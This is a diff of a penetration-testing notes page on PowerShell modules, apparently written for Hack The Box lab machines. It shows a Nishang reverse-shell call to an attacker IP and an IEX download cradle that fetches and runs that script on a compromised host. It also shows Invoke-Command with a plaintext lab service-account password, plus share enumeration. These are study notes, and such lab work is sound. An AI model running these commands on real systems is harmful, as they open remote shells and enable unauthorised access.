@@ -1,5 +1,15 @@
+---
+description: >-
+  Powershell Modules
+title: Powershell Modules              # Add title here
+date: 2023-02-06 08:00:00 -0600                           # Change the date to match completion date
+categories: [03 File Transfer, Powershell Modules]                     # Change Templates to Writeup
+tags: [file transfer, powershell modules]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
+show_image_post: false                                    # Change this to true
+#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
+---
 ### Nishang
-If we want to add a .ps1 file into a Windows machine such as the [Nishang]() series we can modify the latest line of such file (to load the script and then execute it):
+If we want to add a .ps1 file into a Windows machine such as the [Nishang](https://github.com/samratashok/nishang) series we can modify the latest line of such file (to load the script and then execute it):
 ```powershell
         Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
         Write-Error $_
@@ -9,7 +19,7 @@ If we want to add a .ps1 file into a Windows machine such as the [Nishang]() ser
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 1234
 ```
 Then we can execute it by using the following command on the compromised machine:
-```bash
+```powershell
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/Invoke-PowerShellTcp.ps1')
 ```
 Examples:
@@ -17,7 +27,7 @@ Examples:
 
 ### Invoke-Command
 Module to execute commands on the specified machine:
-```bash
+```powershell
 PS> $Password = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
 PS> $Creds = New-Object System.Management.Automation.PSCredential('timelapse.htb\svc_deploy', $Password)
 *PS> Invoke-Command -ComputerName dc01 -Credential $Creds -ScriptBlock { whoami }
@@ -27,7 +37,7 @@ Examples:
 
 ### Get-SMBShare
 Retrieves the local shares:
-```bash
+```powershell
 PS C:\Users\BTables\Desktop> Get-SMBShare
 
 Name   ScopeName Path Description  
@@ -41,7 +51,7 @@ Examples:
 
 ### Select-String
 Search files on the system
-```bash
+```powershell
 PS X:\fulcrum.local\scripts> Select-String -Path "X:\fulcrum.local\scripts\*.ps1" -Pattern Administrator
 PS X:\fulcrum.local\scripts> Select-String -Path "X:\fulcrum.local\scripts\*.ps1" -Pattern 923a
 ```
